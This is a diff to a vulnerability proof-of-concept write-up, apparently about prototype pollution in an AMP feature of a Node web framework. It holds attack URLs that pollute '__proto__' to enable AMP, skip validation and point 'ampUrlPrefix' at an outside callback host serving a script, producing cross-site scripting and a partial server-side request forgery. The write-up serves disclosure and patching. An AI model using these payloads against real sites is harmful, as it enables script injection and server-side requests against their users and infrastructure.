@@ -37,14 +37,14 @@ npm start
 
 **Poc**
 
-1. Request to any AMP enabled page
+1. Request to any AMP enabled page.
 
    ```sh
    # any page that has AMP enabled
    /
    ```
 
-2. If AMP if disabled on vulnerable page enable it via `amp=1&__proto__.amp=hybrid`.
+2. If AMP if disabled on vulnerable page enable it.
 
    ```sh
    /vulnerable?amp=1&__proto__.amp=hybrid
@@ -132,22 +132,32 @@ Also a partial SSRF via `node-fetch` during AMP transform.
 
 **Poc**
 
-1. Request to any AMP enabled page
-2. If AMP if disabled on vulnerable page enable it via `amp=1&__proto__.amp=hybrid`.
+1. Request to any AMP enabled page.
+
+   ```sh
+   # any page that has AMP enabled
+   /
+   ```
+
+2. If AMP if disabled on vulnerable page enable it.
+
+   ```sh
+   /vulnerable?amp=1&__proto__.amp=hybrid
+   ```
+
 3. Request to vulnerable page with `ampUrlPrefix` should trigger the XSS.
 
+   ```sh
+   /vulnerable?__proto__.ampUrlPrefix=https://xss-callback.pwnfunction.repl.co/
+   # Hosted payload: alert(document.domain)
+   ```
+
 ```sh
-# Hosted payload: alert(document.domain)
-
-# XSS on a AMP enabled Page
-/vulnerable?__proto__.ampUrlPrefix=https://xss-callback.pwnfunction.repl.co/
-
-# XSS on a Non-AMP Page (but AMP should be enabled in atleast one other page on the site)
-/vulnerable?amp=1&__proto__.amp=hybrid&__proto__.ampUrlPrefix=https://xss-callback.pwnfunction.repl.co/
-
 # On production
 /vulnerable?amp=1&__proto__.amp=hybrid&__proto__.ampSkipValidation=1&__proto__.ampUrlPrefix=https://xss-callback.pwnfunction.repl.co
+```
 
+```sh
 # Partial SSRF - works if route `/*` does not return 404 else server hangs
 /vulnerable?__proto__.ampUrlPrefix=https://URL/
 
